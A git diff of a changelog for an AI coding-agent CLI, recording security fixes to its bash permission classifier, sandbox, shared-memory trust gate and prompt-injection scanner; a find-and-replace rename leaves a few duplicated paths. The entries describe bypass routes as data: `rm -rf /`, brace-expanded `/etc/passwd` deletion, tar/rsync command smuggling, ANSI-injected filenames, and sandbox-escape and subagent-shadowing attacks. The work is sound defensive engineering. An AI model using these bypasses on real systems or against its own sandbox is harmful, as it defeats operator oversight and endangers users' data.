+- **Q7**: `/memory governance status` enabled-state strings use source provenance: `yes (default; disable: ...)`, `yes (.forja/config.toml)`, `yes (--memory-verify-llm)`, `no (.forja/config.toml)`, `no (--no-memory-verify-llm)`, etc.
 
 **Test footprint:** +24 across 3 files.
 
@@ -8031,7 +9335,7 @@ Three parallel reviewers (correctness/robustness, spec/architecture, test qualit
 
 - **F6 — builtin loader compile-safe (documented).** `import.meta.dir` in `bun build --compile` resolves to a virtual `/$bunfs/` path that `readdirSync` cannot enumerate — built-ins effectively lost in compile mode. Documented the limitation in `src/subagents/paths.ts` header. Operator-facing surface (the existing `verify_semantic_disabled` stderr line in the harness loop) flags the gap loudly when opt-in is set without a resolvable definition. Compile-safe distribution via TS const embedding deferred — tracked as a follow-up since a real fix needs Bun text imports / asset embedding investigation.
 
-- **F7 — shadow guard for protected builtins.** Pre-fix, project-scope `.agent/agents/verify-semantic.md` silently replaced the safe built-in — a malicious repo opting an operator into bash/write_file tools the moment they enable `--memory-verify-llm`. Added a `PROTECTED_BUILTINS` set (`verify-semantic` for now). User AND project shadows of protected builtins ALWAYS surface in the `shadows` array — the existing CLI surface emits these on boot so the operator sees the override. Unprotected built-ins keep the silent-override semantic.
+- **F7 — shadow guard for protected builtins.** Pre-fix, project-scope `.forja/playbooks/verify-semantic.md` silently replaced the safe built-in — a malicious repo opting an operator into bash/write_file tools the moment they enable `--memory-verify-llm`. Added a `PROTECTED_BUILTINS` set (`verify-semantic` for now). User AND project shadows of protected builtins ALWAYS surface in the `shadows` array — the existing CLI surface emits these on boot so the operator sees the override. Unprotected built-ins keep the silent-override semantic.
 
 - **F8 — hallucination guard verifies `evidence_paths` exist.** Pre-fix only checked `paths.length > 0`; a clever subagent emitting `evidence_paths: ['fake/file.ts']` satisfied the guard and quarantined real memories on the operator's auto-rejected path. Added `fs.existsSync(join(cwd, p))` per path with absolute-path rejection and `cwd` boundary check (refuses path traversal). Contradicted verdict with any bogus path → `malformed`.
 
@@ -8262,7 +9566,7 @@ Tests: 8299 pass (+2), 10 skip, 0 fail.
 
 ## [2026-05-17] fix(memory) — Silent-seed when shared corpus has zero files
 
-Review observation: the probe's first-visit branch treated only `presentedHash === EMPTY_CORPUS_HASH` as "empty corpus, silent-seed". `computeSharedFingerprint` returns that sentinel **only** when the shared/ directory is absent (ENOENT). If the directory exists but contains zero `.md` files (operator made `mkdir .agent/memory/shared` via init script / template but never put files there), the fingerprint hashes only the domain separator — a distinct, non-sentinel value. The probe fell into the first-visit modal path over an empty inventory. Worst case: the operator hits Esc / timeout / signal during that modal, the probe returns `deferred(modal_cancel)`, and the shared scope stays offline for the entire session for a corpus that was literally empty.
+Review observation: the probe's first-visit branch treated only `presentedHash === EMPTY_CORPUS_HASH` as "empty corpus, silent-seed". `computeSharedFingerprint` returns that sentinel **only** when the shared/ directory is absent (ENOENT). If the directory exists but contains zero `.md` files (operator made `mkdir .forja/memory/shared` via init script / template but never put files there), the fingerprint hashes only the domain separator — a distinct, non-sentinel value. The probe fell into the first-visit modal path over an empty inventory. Worst case: the operator hits Esc / timeout / signal during that modal, the probe returns `deferred(modal_cancel)`, and the shared scope stays offline for the entire session for a corpus that was literally empty.
 
 Fix: move `enumerateCorpus(input.sharedRoot)` to the top of the first-visit branch and silent-seed when `firstVisitCorpus.length === 0`. Both filesystem states (absent dir → listing.kind!=='present' → empty array; present-but-empty dir → listing.kind==='present', files: []) collapse to the same empty inventory through this gate — one check, no extra IO over the original path. The redundant `EMPTY_CORPUS_HASH` import on the probe goes away; the constant stays exported from `trust-corpus.ts` because it's still the documented sentinel returned by the fingerprint.
 
@@ -8414,7 +9718,7 @@ Critical fixes:
 
 - **H4 plan mode skip.** `--plan` is read-only per AGENTIC_CLI.md §5; a 'no' answer was running destructive bulk-invalidate writes. Gate widened to `input.askSharedTrust !== undefined && isCwdTrusted && input.plan !== true`. Test pins it.
 
-- **F4+M4 headless fail-closed.** When `askSharedTrust` is omitted (CI, `agent run`, plan mode) OR cwd is untrusted, the probe is skipped — but the eager-load gate previously fired only on probe results. Now `sharedScopeOffline` is computed defensively: when the probe is skipped, the bootstrap reads the stored trust row + computes the current hash; only `stored !== null && stored.lastConfirmedHash === currentHash` lets the shared scope load. Untrusted cwd → always excluded. 3 bootstrap tests.
+- **F4+M4 headless fail-closed.** When `askSharedTrust` is omitted (CI, `forja run`, plan mode) OR cwd is untrusted, the probe is skipped — but the eager-load gate previously fired only on probe results. Now `sharedScopeOffline` is computed defensively: when the probe is skipped, the bootstrap reads the stored trust row + computes the current hash; only `stored !== null && stored.lastConfirmedHash === currentHash` lets the shared scope load. Untrusted cwd → always excluded. 3 bootstrap tests.
 
 Important fixes:
 
@@ -8445,7 +9749,7 @@ Three parallel agents (robustness / reliability / security) reviewed the Phase 1
 
 P0 (critical, would have shipped with bypasses):
 
-- **F1 Modal preview ANSI injection.** Attacker-controlled `.agent/memory/shared/` filenames flowed verbatim into the trust modal — a name like `\x1b[2J\x1b[H<fake>.md` lets the attacker repaint the entire trust gate UI. Fix: `state.ts` runs `sanitizeOneLineForDisplay` on every filename AND on `event.path` before rendering. Test in `tests/tui/state.test.ts` covers ANSI escapes, CR/LF/TAB, and path-level injection.
+- **F1 Modal preview ANSI injection.** Attacker-controlled `.forja/memory/shared/` filenames flowed verbatim into the trust modal — a name like `\x1b[2J\x1b[H<fake>.md` lets the attacker repaint the entire trust gate UI. Fix: `state.ts` runs `sanitizeOneLineForDisplay` on every filename AND on `event.path` before rendering. Test in `tests/tui/state.test.ts` covers ANSI escapes, CR/LF/TAB, and path-level injection.
 - **F2 First-visit silent seed.** Pre-S5-hardening, the probe silently stamped any first-visit hash. A poisoned `git clone` with cwd already trusted + pre-populated shared/ → eager-load attacker's content with zero operator consent. Fix: distinguish `EMPTY_CORPUS_HASH` (safe to silent-seed) from non-empty corpus (must prompt in first-visit mode). New `SharedTrustModalMode = 'first-visit' | 'drift'` plumbed through the modal event + reducer + bootstrap callback.
 - **F3 TOCTOU between fingerprint compute and modal answer.** Modal can sit open for minutes; attacker could swap corpus during deliberation and operator's "yes" would stamp the unsesen new hash. Fix: re-compute fingerprint AFTER 'yes'; if it differs from the originally-presented hash, return `{ kind: 'deferred', cause: 'tocttou_during_prompt' }`.
 - **H1-rob Atomic revoke ordering.** Prior order (clear-trust → bulk-invalidate) had a crash-window where surviving active memories silently re-loaded next boot because the re-seed of the trust row at current hash would never fire a re-prompt. Fix: bulk-invalidate FIRST, clear trust row AFTER. Crash mid-bulk leaves the trust row pinned to OLD hash → next boot recomputes, sees divergence, re-prompts; surviving actives get a second chance.
@@ -9093,7 +10397,7 @@ Pipeline finally encosta no operador. The subsystem is now reachable from the mo
 
 `ToolContext.retrieveContext?: RetrieveFn` is the new optional field (same pattern as `memoryRegistry`, `confirmMemoryWrite`, etc.). Imports add `RetrieveFn` from `../retrieval/index.ts`.
 
-`BUILTIN_TOOLS` ordering puts `retrieve_context` next to the read-only memory tools — operator scanning `agent --list-tools` finds them clustered by purpose.
+`BUILTIN_TOOLS` ordering puts `retrieve_context` next to the read-only memory tools — operator scanning `forja --list-tools` finds them clustered by purpose.
 
 Tests: 19 new in `tests/tools/retrieve-context.test.ts` covering tool validation (missing runner / non-string query / empty query / unknown workflow / unknown queryType / budget out of bounds / non-integer budget / invalid views entries / empty views / loadBodies type / duplicate de-dup / aborted signal / runner-thrown errors) plus 5 runner end-to-end (ranked + compressed output for real query, views filter restriction, loadBodies surfaces body-only matches, defaultBudgetTokens respected, retrieval_trace row persisted per call). Bootstrap test list updated to include `retrieve_context`.
 
@@ -10208,7 +11512,7 @@ Also includes migration 048 (memory_events.action CHECK enum expanded), which th
 - **1.3.c2** — Wire verify-before-act detector → `active → quarantined` (motivo=shift, trigger=verify_failed).
 - **1.3.c3** — Wire `/memory delete` slash → 2-step `active → quarantined → evicted`. Note: state machine rejects direct `active → evicted`. Spec EVICTION §4.1 may eventually warrant a `user_purge` motivo on the direct path (follow-up; would require spec PR).
 - **1.3.d** — `/memory restore <name>` slash + re-admission flow.
-- **GC sweep** — `agent gc` calls `listExpiredTombstones` + transition `evicted → purged` per scope retention window.
+- **GC sweep** — `forja gc` calls `listExpiredTombstones` + transition `evicted → purged` per scope retention window.
 
 ### Verification
 
@@ -10257,7 +11561,7 @@ Also includes migration 048 (memory_events.action CHECK enum expanded), which th
 
 - **1.3.c** — `transitionMemoryState` that calls `moveToTombstone` as part of `active → evicted` flow, plus `eviction_events` + `memory_events` emission and `Eviction` hook firing.
 - **1.3.d** — `/memory restore <name>` that reads `findLatestTombstone` and copies the body back into the scope root as `proposed`.
-- **GC sweep** — `agent gc` would call `listExpiredTombstones` per scope and `removeFromTombstones` for each expired entry. Lives outside the memory subsystem (cross-cutting concern); the helpers are ready when the sweep lands.
+- **GC sweep** — `forja gc` would call `listExpiredTombstones` per scope and `removeFromTombstones` for each expired entry. Lives outside the memory subsystem (cross-cutting concern); the helpers are ready when the sweep lands.
 
 ### Verification
 
@@ -10978,7 +12282,7 @@ Fix: tiered enforcement, gated by what context the caller supplied:
 
 - **systemDeny + absoluteEscalate** (`/proc`, `/sys`, `/boot`, `/dev`, `/run`, `/var/run`, `/etc`): constants — no home/cwd needed. **ALWAYS enforced.**
 - **tildeEscalate{Files,Dirs}** (`~/.ssh`, `~/.gnupg`, `~/.bashrc`, etc.): require `home`. Enforced **only when home is supplied**.
-- **cwdEscalateDirs** (`<cwd>/.git`, `<cwd>/.agent`, `<cwd>/.claude`): require `cwd`. Enforced **only when cwd is supplied**.
+- **cwdEscalateDirs** (`<cwd>/.git`, `<cwd>/.forja`, `<cwd>/.claude`): require `cwd`. Enforced **only when cwd is supplied**.
 
 Operator tooling that supplies neither still gets meaningful protection for the system-level redefinitions that are the highest-impact mistakes; tooling that supplies one of the two gets the corresponding extra tier without paying the cost of constructing the other.
 
@@ -11044,21 +12348,21 @@ Fix: add the same absolute-path guard before pushing the overlay. Per XDG Base D
 
 ## [2026-05-14] fix(cli/args) — anchor welcome subcommand detection to argv[0]
 
-**Done.** `parseWelcomeSubcommand` scanned the entire argv via `findIndex(t => t === 'welcome')`, intended to accept `agent --i-know-what-im-doing welcome` (welcome after a flag). That ergonomic relaxation regression-broke any normal prompt containing the literal word `welcome`:
+**Done.** `parseWelcomeSubcommand` scanned the entire argv via `findIndex(t => t === 'welcome')`, intended to accept `forja --i-know-what-im-doing welcome` (welcome after a flag). That ergonomic relaxation regression-broke any normal prompt containing the literal word `welcome`:
 
-- `agent --json welcome` (prompt is the word "welcome", request JSON output) → welcomeIdx=1, treated as welcome subcommand, `--json` becomes "unknown welcome flag"
+- `forja --json welcome` (prompt is the word "welcome", request JSON output) → welcomeIdx=1, treated as welcome subcommand, `--json` becomes "unknown welcome flag"
 - `agent hello welcome world` (prompt is a sentence containing welcome) → same trap, `hello` and `world` rejected
 
 Both are core CLI flows — operators typing literal English prompts shouldn't hit unknown-flag errors.
 
-Fix: anchor detection to argv[0], matching every other subcommand in this parser (init / recap / sandbox / doctor / permission). The flag-then-welcome case the earlier cut targeted is already covered by the `--i-know-what-im-doing` top-level rejection (slice 123 R9 P1): an operator typing `agent --i-know-what-im-doing welcome` hits the explicit error pointing at `agent welcome --i-know-what-im-doing`, so the UX is recoverable without breaking prompt parsing.
+Fix: anchor detection to argv[0], matching every other subcommand in this parser (init / recap / sandbox / doctor / permission). The flag-then-welcome case the earlier cut targeted is already covered by the `--i-know-what-im-doing` top-level rejection (slice 123 R9 P1): an operator typing `forja --i-know-what-im-doing welcome` hits the explicit error pointing at `forja welcome --i-know-what-im-doing`, so the UX is recoverable without breaking prompt parsing.
 
 ### Files modified
 
 | File | Change |
 |---|---|
 | `src/cli/args.ts` | `parseWelcomeSubcommand` checks `argv[0] === 'welcome'` instead of scanning the whole argv |
-| `tests/cli/args.test.ts` | +5 tests: `--json welcome` is a prompt not subcommand, multi-token prompt with "welcome", quoted prompt with "welcome", canonical `agent welcome` still works, `agent welcome --help` still works |
+| `tests/cli/args.test.ts` | +5 tests: `--json welcome` is a prompt not subcommand, multi-token prompt with "welcome", quoted prompt with "welcome", canonical `forja welcome` still works, `forja welcome --help` still works |
 
 ### Verification
 
@@ -11075,7 +12379,7 @@ Verified the same pattern is NOT present in the other two sealing backends:
 - **worm-file** (`sealing.ts:165`) uses `dirname(opts.path)` which correctly returns `"/"` for `"/"`.
 - **git-anchored** (`sealing.ts:377`) uses template-literal concat `${stripped}/${sealFile}` — the literal `/` inside the template means a stripped-to-empty `repoPath` still produces `"/seal.log"` (absolute, not CWD-relative). Different shape, no bug.
 
-Fix: guarded the regex with `/^\/+$/.test(opts.path)` that catches all-slashes inputs and returns `"/"` instead. Other paths (`"/var/lib/agent/"` → `"/var/lib/agent"`, `"/var/lib/agent"` → unchanged) preserve their existing semantics.
+Fix: guarded the regex with `/^\/+$/.test(opts.path)` that catches all-slashes inputs and returns `"/"` instead. Other paths (`"/var/lib/forja/"` → `"/var/lib/forja"`, `"/var/lib/forja"` → unchanged) preserve their existing semantics.
 
 ### Files modified
 
@@ -11577,7 +12881,7 @@ The deferred items split naturally into 4 future slices (silent_passthrough emit
 
 ## [2026-05-14] fix(harness/resolvers) — slice 167: Batch E threat surface (injection scanner + find -delete)
 
-**Done.** Two of four items from Batch E (threat surface) of task #268. The remaining two (trust hash-aggregate on `.agent/**`, hook-script trust-hash check) are substantial enough to deserve their own slices — deferred with notes below.
+**Done.** Two of four items from Batch E (threat surface) of task #268. The remaining two (trust hash-aggregate on `.forja/**`, hook-script trust-hash check) are substantial enough to deserve their own slices — deferred with notes below.
 
 ### 1. Tool-output prompt-injection scanner (threat-model review P1 #1)
 
@@ -11606,7 +12910,7 @@ Same phrase list (`INJECTION_PHRASES`) + secret patterns (`SECRET_PATTERNS`) the
 
 Two items remain pending:
 
-- **Trust hash-aggregate enforcement** (`AGENTIC_CLI.md §9.1`): `src/trust/storage.ts:6-14` defers this with an explicit comment. Computing SHA over the canonical-versioned set (AGENTS.md, .agent/permissions.yaml, .agent/hooks.toml, .agent/memory/shared/**, .agent/playbooks/**, .agent/agents/**, .agent/orchestrators/**) at trust time + on every boot is M-effort. Deserves its own slice with the hash-aggregate algorithm + schema migration. Postponed.
+- **Trust hash-aggregate enforcement** (`AGENTIC_CLI.md §9.1`): `src/trust/storage.ts:6-14` defers this with an explicit comment. Computing SHA over the canonical-versioned set (AGENTS.md, .forja/permissions.yaml, .forja/hooks.toml, .forja/memory/shared/**, .forja/playbooks/**, .forja/playbooks/**, .forja/orchestrators/**) at trust time + on every boot is M-effort. Deserves its own slice with the hash-aggregate algorithm + schema migration. Postponed.
 - **Hook script trust-hash check** (`SECURITY_GUIDELINE.md §1.2`): per-hook `hook_runs.script_hash` + warning on mismatch + operator-approval flow via `/hooks trust`. Schema change + slash-command surface + warning UX. M-effort. Postponed.
 
 Both will land as dedicated slices; the failure code vocabulary should grow `trust.aggregate_changed` and `hook.script_hash_mismatch` when they ship.
@@ -12320,7 +13624,7 @@ The 3 callsites phase 2 actually scopes:
 2. **Bg manager spawn** (`src/bg/manager.ts:605`) — always wraps when sandbox available.
 3. **Grep spawn** (`src/tools/builtin/grep.ts:131`) — always wraps when sandbox available.
 
-In-process bash (`agent --prompt "echo hi"` default) runs unsandboxed regardless of slice 157. Closing THAT vector requires either (a) plumbing maybeWrap into the bash handler directly, OR (b) defaulting `brokerMode` to `'spawn'`. Out of scope for this slice — flagged as follow-up.
+In-process bash (`forja --prompt "echo hi"` default) runs unsandboxed regardless of slice 157. Closing THAT vector requires either (a) plumbing maybeWrap into the bash handler directly, OR (b) defaulting `brokerMode` to `'spawn'`. Out of scope for this slice — flagged as follow-up.
 
 ### Env discipline
 
@@ -12644,7 +13948,7 @@ After slice 154 the sandbox binary surface has 4 independent layers:
 1. **Canonical hard-pin** — `/usr/bin/<tool>` literal wins by default.
 2. **Stat-check** — PATH-resolved fallback validates ownership + mode.
 3. **Argv discipline** — absolute path passed to `execve()`; no PATH re-walk.
-4. **Operator visibility** — trust warnings persisted to telemetry + rendered in `agent doctor` / `agent sandbox setup`. Forensic trail.
+4. **Operator visibility** — trust warnings persisted to telemetry + rendered in `forja doctor` / `forja sandbox setup`. Forensic trail.
 
 ### Deferred items from bash-tools review (status)
 
@@ -12994,7 +14298,7 @@ After slice 148 the 🔴 critical column is empty. Remaining 🟠 / 🟡:
 | # | Finding | File | Fix |
 |---|---|---|---|
 | **R1** | `... \| python -c '...'` / `... \| node` / `... \| xargs sh -c '...'` were not detected as pipe-to-shell. `SHELL_INTERPRETERS` covered only shell binaries (`sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`), letting interpreters that read stdin as code slip through. Spec §5.2 lists `python -c` explicitly as Refuse. | `src/permissions/resolvers/bash.ts:234-262` | Expanded `SHELL_INTERPRETERS` to include `python`, `python3`, `node`, `nodejs`, `ruby`, `perl`, `php`, `lua`, `luajit`. Added `xargs <interpreter>` detection: when the last pipe stage is `xargs`, scan its arg children for any embedded shell-interpreter literal. Over-refuses for `xargs --some-flag bash` (where bash isn't actually exec'd) but under-refuses nothing dangerous. |
-| **exec-arb** | `cmdNpmLike` / `cmdPip` / `cmdMake` / `cmdCargo` and the conservative-fallback for unknown commands emit `exec:arbitrary` + `medium` confidence. `exec:arbitrary` didn't qualify under `capability_risk` (which gates on delete-fs / git-write / env-mutate / agent-mutate) and had no dedicated weight. Total score: `confidence_medium` (+0.10) alone — well under the 0.4 confirm threshold. `npm install` / `pip install` / `cargo build` / `make` auto-allowed under default policy. | `src/permissions/risk-score.ts` | Added `exec_arbitrary: 0.3` to `RISK_SCORE_WEIGHTS`. New feature in `computeRiskScore` matches any capability with `kind: 'exec'` and `scope: 'arbitrary'` (intentionally excludes `exec:shell`/`exec:python`/`exec:node`). Total now: exec_arbitrary (0.30) + confidence_medium (0.10) = 0.40, hitting the threshold for confirm upgrade. |
+| **exec-arb** | `cmdNpmLike` / `cmdPip` / `cmdMake` / `cmdCargo` and the conservative-fallback for unknown commands emit `exec:arbitrary` + `medium` confidence. `exec:arbitrary` didn't qualify under `capability_risk` (which gates on delete-fs / git-write / env-mutate / forja-mutate) and had no dedicated weight. Total score: `confidence_medium` (+0.10) alone — well under the 0.4 confirm threshold. `npm install` / `pip install` / `cargo build` / `make` auto-allowed under default policy. | `src/permissions/risk-score.ts` | Added `exec_arbitrary: 0.3` to `RISK_SCORE_WEIGHTS`. New feature in `computeRiskScore` matches any capability with `kind: 'exec'` and `scope: 'arbitrary'` (intentionally excludes `exec:shell`/`exec:python`/`exec:node`). Total now: exec_arbitrary (0.30) + confidence_medium (0.10) = 0.40, hitting the threshold for confirm upgrade. |
 | **rm-root** | `cmdRm` emitted `delete-fs(<resolved-path>)` without a literal blocklist. `classifyProtectedPath('/', 'write')` returned `null` because `SYSTEM_DENY_ROOTS = ['/proc', '/sys', '/boot', '/dev']` didn't include `/`, `/etc`, `/home`, etc. `/etc` was an `escalate` (confirm), but `/`, `/home`, `/usr`, `/root` were classified-null. Score gate + default-deny vetoed `rm -rf /` under default config (capability_risk + workspace_escape + blocklist_command ≈ 0.85 → confirm), but a permissive `allow delete-fs:/**` would have auto-allowed. The comment in `protected_paths.ts:30` even CLAIMED a "bash deny list" caught `rm -rf /` — that list didn't exist. | `src/permissions/resolvers/bash.ts` (`cmdRm`) + `src/permissions/protected_paths.ts:30-35` (comment fix) | New `RM_REFUSE_ROOTS` set (`/`, `/etc`, `/usr`, `/var`, `/lib`, `/lib64`, `/bin`, `/sbin`, `/boot`, `/root`, `/opt`, `/home`, `/dev`, `/proc`, `/sys`). `cmdRm` refuses BEFORE emitting `delete-fs` if any positional resolves to a member, OR resolves to `ctx.home` (catches `rm -rf ~` and `rm -rf $HOME`). Policy-independent: a permissive `allow delete-fs:/**` no longer bypasses this. Comment in `protected_paths.ts` rewritten to reflect the actual defense surface. |
 
 ### Tests added (+34)
@@ -13429,7 +14733,7 @@ Spec PR + code in the same slice per CLAUDE.md root rule ("diverging from spec r
   - Defensive parse on `score_components_json` — malformed JSON or non-number values degrade silently to `{}` with a stderr warn, never aborting the sweep.
 - `summarizeCalibrationCoverage(db, options)` — same filter set, returns counts by outcome label + decision + signal coverage. Lets a CLI report low-coverage states ("<100 triples in window — calibration sweep recommended at ≥100+ rows") without dragging the full triple set across the boundary.
 
-**CLI verb** (`agent permission calibration-export`):
+**CLI verb** (`forja permission calibration-export`):
 
 - Flags: `--json` (NDJSON triples on stdout, summary on stderr), `--since-days N` (default 30 per spec), `--all-decisions` (widens to `'*'`).
 - Text mode: coverage summary on stdout — install_id, window, counts, by-decision, with-signal, sparse-window note.
@@ -13437,7 +14741,7 @@ Spec PR + code in the same slice per CLAUDE.md root rule ("diverging from spec r
 
 **Pre-existing bug fixed** (`src/cli/index.ts`):
 
-- The promptOptional check didn't list `args.permission !== undefined`, so EVERY permission verb (`verify`, `seal-now`, etc., now also `calibration-export`) hit the empty-prompt branch first. Through index.ts, `agent permission verify --json` produced "--json requires a prompt" instead of the chain integrity report. The dispatcher in run.ts was correct; the gate in index.ts had a missing condition. Added `args.permission !== undefined` to the list. The existing unit tests bypass index.ts (they call `runPermissionVerify` directly), which is why the gap survived to slice 138.
+- The promptOptional check didn't list `args.permission !== undefined`, so EVERY permission verb (`verify`, `seal-now`, etc., now also `calibration-export`) hit the empty-prompt branch first. Through index.ts, `forja permission verify --json` produced "--json requires a prompt" instead of the chain integrity report. The dispatcher in run.ts was correct; the gate in index.ts had a missing condition. Added `args.permission !== undefined` to the list. The existing unit tests bypass index.ts (they call `runPermissionVerify` directly), which is why the gap survived to slice 138.
 
 ### Tests added
 
@@ -13737,8 +15041,8 @@ P1 cluster (23 findings): full list in slice-134 review punch list. Will batch p
   - §10 Reporting — points at repo-root `SECURITY.md` for disclosure policy.
 
 - **`docs/AUDIT.md`** (678 lines) — operator audit guide in English. Companion to `docs/spec/AUDIT.md` (PT-BR protocol). Covers:
-  - §1 Quick reference — implemented CLI verbs (11) vs deferred (`agent audit timeline/failures/costs`, `agent forensics`, `agent gc`, `redaction_events`).
-  - §2 Daily workflow — `agent permission verify` + `seal-verify` + cron suggestion.
+  - §1 Quick reference — implemented CLI verbs (11) vs deferred (`agent audit timeline/failures/costs`, `agent forensics`, `forja gc`, `redaction_events`).
+  - §2 Daily workflow — `forja permission verify` + `seal-verify` + cron suggestion.
   - §3 Post-incident review — find session → walk decisions → replay specific seq → join with tool_calls for raw args → failure_events + outcome_signals in same session.
   - §4 Sealing backends — worm-file, RFC3161, git-anchored, S3 object lock; setup + threat model + cost + decision matrix.
   - §5 Chain rotation — what it does, running, inspecting + quarantine clearance (rotations default quarantined=1, require `--clear`), `--accept-broken-chain`.
@@ -13918,7 +15222,7 @@ Additional polish landed: `scrubOutcomePayload` direct test (`tests/outcomes/scr
 - **Spec PRs** (5 divergences): outcome_signals not in AUDIT.md §1 tables list; `chain_hash` omitted vs §4.2 ("all audit tables"); per-kind retention 730d divergence from §1.2; composite policy + threshold 0.5 + per-kind weights all invented vs §6.3.2; `denied_after_allow` proxy candidate. Batch as one spec PR.
 - **Batch emit in `--undo`** (one transaction wrapping 200 emits vs 200 BEGIN IMMEDIATE cycles). Real-but-bounded latency; defer to a perf-targeted slice if `--undo` UX feedback flags it.
 - **`UNIQUE(approval_seq, signal_kind)` + INSERT OR IGNORE** for tool_error explosion dedup. Acceptable storage cost in practice; calibration handles dedup. Defer.
-- **`aggregator` outcome=`unknown` when signal TTL expired but approval survives.** Reviewer concern about silent harmless-mislabeling after GC. Real but only matters once `agent gc` exists (deferred slice).
+- **`aggregator` outcome=`unknown` when signal TTL expired but approval survives.** Reviewer concern about silent harmless-mislabeling after GC. Real but only matters once `forja gc` exists (deferred slice).
 - **Composite weight=0 ambiguity** (no-signal vs zero-weight-signal both render harmless). Calibration sweep may zero weights in place; defer until that pattern actually fires.
 - **Threshold-0.5 gameable via 0.4999 epsilon override**. Production wires don't expose weight override; only calibration sweeps do, and those are operator-trusted. Defer.
 - **Integration test for §6.3.2 end-to-end triple** (seed approval → multiple signals → calibration extract). Each piece is tested; the chain is verified by inspection. Defer.
@@ -14008,7 +15312,7 @@ Convention documented in `scrub.ts` + `codes.ts`: when a failure is downstream o
 - **Mid-session loss probe at `broker/handlers/bash.ts`** — runs in a worker subprocess (no in-process sink reference, IPC required). Defer until failure_events IPC protocol is designed.
 - **`agent audit failures` CLI verb** — spec AUDIT.md §6 mentions. Reader API exists (`listFailureEventsByCode`, `countFailuresByCodeSince`); the CLI surface lands when the `agent audit` subsystem ships.
 - **Forensics bundle inclusion** (spec §5.1: `failure_events.ndjson`) — bundle generation is its own slice.
-- **`agent gc` retention** (spec §1.2: 365d) — gc subsystem doesn't exist yet.
+- **`forja gc` retention** (spec §1.2: 365d) — gc subsystem doesn't exist yet.
 - **17+ codes from spec catalog** — provider/mcp/parse/classifier/index/etc. Each wires when its subsystem gets a refactor slice.
 
 ### Verification
@@ -14131,7 +15435,7 @@ Multi-agent review (4 parallel reviewers: security/chain integrity, reliability/
 
 | # | File | Symptom → Fix |
 |---|---|---|
-| Sand-1/2 | `src/permissions/sandbox-hide-paths.ts` | `~/.config/agent` (user policy file) and `~/.config/forja` (sandbox_skip marker dir) writable from `home-rw` and NOT in HIDE_PATHS_DIRS. Sandboxed process could plant a policy/marker that next boot reads as authoritative — full escape on session N+1. Added both to HIDE_PATHS_DIRS. |
+| Sand-1/2 | `src/permissions/sandbox-hide-paths.ts` | `~/.config/forja` (user policy file) and `~/.config/forja` (sandbox_skip marker dir) writable from `home-rw` and NOT in HIDE_PATHS_DIRS. Sandboxed process could plant a policy/marker that next boot reads as authoritative — full escape on session N+1. Added both to HIDE_PATHS_DIRS. |
 | Inj-1 | `src/subagents/ipc.ts:138` | Parent↔child IPC `parseLine` used bare `JSON.parse`. Slice 104 fixed broker boundary but missed IPC. Routed through `safeJsonParse` for proto-pollution defense. |
 | Bypass-1 | `src/permissions/resolvers/bash.ts:2037` | `bash_background`/`bash_output`/`bash_kill` had no resolver. `resolveCapabilities(toolName)` returned empty caps; engine §10.1 envelope gate skipped when caps empty. Registered the bash AST resolver for all three. |
 | Launder-1 | `src/permissions/resolvers/bash.ts` HARD_REFUSE_COMMANDS | `command` and `builtin` (POSIX bypass-aliases-and-functions builtins) registered as cmdSysInfo (read-fs:/etc only). `command rm -rf /home` emitted no delete-fs. Moved to HARD_REFUSE_COMMANDS. |
@@ -14225,7 +15529,7 @@ Slices 95-128 (34 consecutive) drained **83 P0 + 37 P1 + 1 P2 findings across fo
 
 - **`src/permissions/resolvers/bash.ts:1644` expandBraces ranges** — `{a..z}` and `{1..10}` single-element braces returned `[arg]` unchanged pre-slice; `rm /e{a..z}c/passwd` then bypassed the deterministic classifier (the brace-expanded `/etc/passwd` was never produced for classifyProtectedPath to see). Now single-char ranges (`{a..z}`) and integer ranges (`{1..10}`) expand deterministically. Step syntax / multi-char endpoints fall through to literal (rare in practice).
 - **`src/permissions/sandbox-runner-macos.ts:75-80` escapeSbplLiteral** — extended CR/LF reject to the full CC0 (`\x00-\x1F`) + CC1 (`\x7F-\x9F`) range. Symmetric with `welcome.ts` CONTROL_CHAR_RE (slice 125). Forecloses ANSI ESC / BEL / OSC injection into the SBPL profile.
-- **`src/cli/doctor.ts:430` chainCheck remediation** — pre-slice "run `agent permission verify` for details" was misleading because that command silently migrates the schema. Reworded to "check ${dbPath} for corruption / permissions, OR run `agent permission verify` which migrates the schema AND re-verifies the chain". The asymmetry is now explicit.
+- **`src/cli/doctor.ts:430` chainCheck remediation** — pre-slice "run `forja permission verify` for details" was misleading because that command silently migrates the schema. Reworded to "check ${dbPath} for corruption / permissions, OR run `forja permission verify` which migrates the schema AND re-verifies the chain". The asymmetry is now explicit.
 - **`src/permissions/resolvers/bash.ts:1075` cmdRsync** — `--password-file=<path>` / `--password-file <path>` now emits `read-fs(path)` so operator allow rules on credential files fire.
 - **`src/cli/subagent-child.ts:627` audit sink fallback** — `ensureInstallId` failure no longer silent. Logs to `errSink` with explicit "child running with noop audit (decisions will NOT enter approvals_log chain)" + error message.
 - **`src/permissions/resolvers/bash.ts:1932` analyzeCommand classifier loop** — added `expandTilde(exp, ctx.home)` before resolvePath in BOTH the glob-bypass branch and the per-expansion classifier branch. Pre-slice `~/.ssh/id_rsa` resolved to `/work/proj/~/.ssh/id_rsa` (literal `~` under cwd) which never matched the tilde-rooted protected targets. The discovered-by-test gap when writing R3 tests for `~/.s*`.
@@ -14355,7 +15659,7 @@ Roadmap left in the R-bucket scope: only R12's fuzz CI workflow (aspirational, n
 |---|---|---|
 | 1 | `src/permissions/resolvers/bash.ts:618` cmdTar | tar GTFOBins flags (`--checkpoint-action=exec=<cmd>`, `--use-compress-program=<cmd>`, `--to-command=<cmd>`, short alias `-I`) executed arbitrary local commands via the value half. Hard refuse symmetric to ssh's `ProxyCommand`. |
 | 2 | `src/permissions/resolvers/bash.ts:898` cmdRsync | rsync `-e <cmd>` / `--rsh=<cmd>` substituted the transport (literal local exec); `--rsync-path=<cmd>` ran arbitrary remote command. Pre-slice the comment acknowledged the threat but the runtime did nothing. Hard refuse all three. |
-| 3 | `src/permissions/resolvers/bash.ts:1473` analyzeCommand | Shell brace + glob expansion bypassed `classifyProtectedPath`. New `expandBraces` deterministically enumerates `{a,b,c}` and re-runs the classifier per branch. New `containsGlobMetachar` + `globLiteralPrefix` + `couldGlobReachProtected` refuse globs whose literal prefix could expand into system-level protected zones (`/proc`, `/sys`, `/etc`, `~/.ssh`, etc.). cwd-relative escalate dirs (`.git`, `.agent`, `.claude`) deliberately excluded from the bypass check to avoid false-positive on legitimate `*.ts` in cwd. |
